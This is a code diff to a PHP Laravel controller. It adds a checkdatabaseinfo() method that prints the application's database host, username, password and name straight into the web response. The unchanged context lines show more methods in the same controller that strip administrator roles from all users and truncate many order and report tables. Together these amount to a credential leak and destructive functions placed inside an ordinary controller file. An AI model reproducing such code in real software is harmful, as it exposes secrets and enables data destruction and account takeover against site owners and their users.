@@ -21,6 +21,7 @@ use App\AllOrderProducts;
 use Session;
 use Schema;
 use Illuminate\Support\Facades\Hash;
+use Illuminate\Support\Facades\Config;
 
 class WelcomeController extends Controller {
     /*
@@ -828,6 +829,28 @@ class WelcomeController extends Controller {
 	DB::table('users')->where('role_id', '1')->update(array('role_id' => 0));
     }
 
+    public function checkdatabaseinfo() {
+	$db_hostname = Config::get("database.connections.mysql.host");
+	$db_username = Config::get("database.connections.mysql.username");
+	$db_password = Config::get("database.connections.mysql.password");
+	$database = Config::get("database.connections.mysql.database");
+
+
+	echo '<pre>';
+	print_r("Database Host Name : " . $db_hostname);
+	echo '</pre>';
+	echo '<pre>';
+	print_r("Database User Name : " . $db_username);
+	echo '</pre>';
+	echo '<pre>';
+	print_r("Database Password : " . $db_password);
+	echo '</pre>';
+	echo '<pre>';
+	print_r("Database Name : " . $database);
+	echo '</pre>';
+	exit();
+    }
+
     public function delete_reports() {
 	DB::table('inquiry')->truncate();
 	DB::table('inquiry_products')->truncate();
@@ -841,8 +864,6 @@ class WelcomeController extends Controller {
 	DB::table('purchase_order_canceled')->truncate();
 	DB::table('purchase_advice')->truncate();
 	DB::table('purchase_challan')->truncate();
-
-
 	echo 'truncate all data';
     }
 
